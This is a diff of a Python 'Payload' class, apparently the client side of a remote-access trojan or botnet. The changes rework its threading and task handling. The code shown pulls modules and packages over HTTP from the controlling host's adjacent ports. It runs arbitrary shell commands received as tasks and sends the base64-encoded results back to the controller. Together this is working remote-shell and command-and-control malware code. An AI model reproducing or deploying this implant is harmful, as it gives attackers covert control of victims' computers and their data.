@@ -131,7 +131,7 @@ class Payload():
         self.connection.sendall(msg)
         return info
 
-    def _get_resources(self, target=None, base_url=None):
+    def _get_resources(self, target=None, base_url=None, threads=[]):
         try:
             if not isinstance(target, list):
                 raise TypeError("keyword argument 'target' must be type '{}'".format(list))
@@ -142,7 +142,7 @@ class Payload():
             log(level='info', info= '[*] Searching %s' % base_url)
             path = urllib.parse.urlsplit(base_url).path
             base = path.strip('/').replace('/','.')
-            with urllib.request.urlopen(base_url) as response:
+            with urllib.request.urlopen(base_url, timeout=10) as response:
                 info = response.info()
                 if 'text' in info.get_content_type():
                     lines = response.read().decode('utf-8').splitlines()
@@ -160,6 +160,7 @@ class Payload():
                             t = threading.Thread(target=self._get_resources, kwargs={'target': target, 'base_url': '/'.join((base_url, n))})
                             t.daemon = True
                             t.start()
+                            threads.append(t)
                         elif not 'dist-info' in ext:
                             resource = '/'.join((path, n))
                             if resource not in target:
@@ -170,9 +171,15 @@ class Payload():
     @threaded
     def _get_resource_handler(self):
         try:
+            threads = []
             host, port = self.connection.getpeername()
-            self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1))
-            self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2))
+            self._get_resources(target=self.remote['modules'], base_url='http://{}:{}'.format(host, port + 1), threads=threads)
+            self._get_resources(target=self.remote['packages'], base_url='http://{}:{}'.format(host, port + 2), threads=threads)
+            count = len(threads)
+            while count > 0:
+                count = 0
+                for t in threads: count = count + 1 if t.is_alive() else count
+                time.sleep(15)
             print(json.dumps(self.remote, indent=2))
         except Exception as e:
             log(str(e))
@@ -197,8 +204,7 @@ class Payload():
             jobs = self.handlers.items()
             for task, worker in list(jobs):
                 if not worker.is_alive():
-                    dead = self.handlers.pop(task, None)
-                    del dead
+                    self.handlers.pop(task, None).join()
             if globals()['_abort']:
                 break
             time.sleep(0.5)
@@ -1017,11 +1023,12 @@ class Payload():
                         cmd, _, action = task['task'].partition(' ')
                         try:
                             command = self._get_command(cmd)
-                            result = bytes(command(action) if action else command()) if command else bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                            result = (command(action) if action else bytes(str(command()), 'utf-8')) if command else bytes('',encoding='utf-8').join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
+                            print(result)
                         except Exception as e:
                             result = "{} error: {}".format(self.run.__name__, str(e))
                             log(level='debug', info=result)
-                        task.update({'result': base64.b64encode(result).decode('utf-8')})
+                        task.update({'result': base64.b64encode(result).decode('utf-8') if isinstance(result, bytes) else result})
                         try:
                             self.send_task(task)
                         except Exception as e:
